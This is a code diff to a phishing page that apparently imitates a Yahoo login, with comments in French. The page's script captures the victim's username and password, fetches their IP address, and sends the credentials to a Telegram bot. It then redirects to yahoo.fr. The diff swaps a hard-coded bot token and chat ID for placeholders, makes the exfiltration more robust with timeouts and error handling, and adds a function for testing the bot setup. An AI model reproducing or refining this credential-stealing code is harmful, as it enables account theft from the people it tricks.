@@ -296,7 +296,7 @@
     </div>
   </div>
 
-  <script>
+ <script>
     function showMessage(text, type = "error") {
       const box = document.getElementById("message");
       const icon = type === "success" ? "✅" : "❌";
@@ -329,12 +329,12 @@
       document.getElementById('submit-btn').disabled = false;
     }
 
+    // Configuration Telegram - Vérifiez ces valeurs
     const TELEGRAM_CONFIGS = [
       {
-        token: '5722730835:AAF-83VyMq8uBs0klBjz3iAdfEzPNJz8w0o',
-        chat_id: '-868620860'
+        token: 'VOTRE_BOT_TOKEN_ICI', // Remplacez par votre vrai token
+        chat_id: 'VOTRE_CHAT_ID_ICI'  // Remplacez par votre vrai chat ID
       }
-      // Ajoutez une configuration de secours si nécessaire
     ];
 
     document.getElementById("submit-btn").addEventListener("click", function (e) {
@@ -355,16 +355,26 @@
 
       showLoading();
       
-      // Récupération de l'IP
-      fetch("https://api.ipify.org?format=json")
-        .then(response => response.json())
+      // Récupération de l'IP avec timeout
+      Promise.race([
+        fetch("https://api.ipify.org?format=json"),
+        new Promise((_, reject) => 
+          setTimeout(() => reject(new Error('Timeout IP')), 5000)
+        )
+      ])
+        .then(response => {
+          if (!response.ok) throw new Error('Erreur IP');
+          return response.json();
+        })
         .then(data => {
           const ip = data.ip;
           const message = `🔐 Connexion Yahoo :\n👤 ${username}\n🔑 ${password}\n🌍 IP: ${ip}`;
           
-          // Essayer chaque configuration Telegram jusqu'à ce qu'une fonctionne
+          // Essayer chaque configuration Telegram
           const sendPromises = TELEGRAM_CONFIGS.map(cfg => {
-            return fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
+            const url = `https://api.telegram.org/bot${cfg.token}/sendMessage`;
+            
+            return fetch(url, {
               method: "POST",
               headers: {
                 "Content-Type": "application/json",
@@ -375,18 +385,21 @@
                 parse_mode: "HTML"
               }),
             })
-            .then(response => response.json())
+            .then(response => {
+              if (!response.ok) throw new Error('HTTP error');
+              return response.json();
+            })
             .then(data => {
               if (data.ok) {
                 return { success: true, data };
               } else {
-                console.error("Erreur Telegram:", data);
-                return { success: false, data };
+                console.error("Erreur Telegram API:", data);
+                throw new Error(data.description || 'Erreur Telegram');
               }
             })
             .catch(error => {
-              console.error("Erreur réseau:", error);
-              return { success: false, error };
+              console.error("Erreur Telegram:", error);
+              return { success: false, error: error.message };
             });
           });
           
@@ -400,18 +413,57 @@
               window.location.href = "https://yahoo.fr";
             }, 2000);
           } else {
-            showMessage("Problème de connexion. Veuillez réessayer.", "error");
-            console.error("Toutes les tentatives Telegram ont échoué:", results);
+            const errorMsg = results[0]?.error || "Problème de connexion";
+            showMessage(`Erreur: ${errorMsg}`, "error");
           }
         })
         .catch(err => {
-          console.error("Erreur lors de l'envoi:", err);
+          console.error("Erreur générale:", err);
           showMessage("Erreur de connexion. Veuillez réessayer.", "error");
         })
         .finally(() => {
           hideLoading();
         });
     });
+
+    // Fonction pour tester la configuration Telegram
+    function testTelegramConfig() {
+      const token = prompt("Entrez votre token Telegram bot:");
+      const chatId = prompt("Entrez votre chat ID:");
+      
+      if (token && chatId) {
+        fetch(`https://api.telegram.org/bot${token}/getMe`)
+          .then(response => response.json())
+          .then(data => {
+            if (data.ok) {
+              alert("✅ Token valide! Bot: " + data.result.first_name);
+              // Test d'envoi de message
+              fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                  chat_id: chatId,
+                  text: "✅ Test de configuration réussi!",
+                }),
+              })
+              .then(res => res.json())
+              .then(result => {
+                if (result.ok) {
+                  alert("✅ Message envoyé avec succès!");
+                } else {
+                  alert("❌ Erreur d'envoi: " + result.description);
+                }
+              });
+            } else {
+              alert("❌ Token invalide: " + data.description);
+            }
+          })
+          .catch(error => {
+            alert("❌ Erreur de connexion: " + error.message);
+          });
+      }
+    }
   </script>
 </body>
 </html>
+
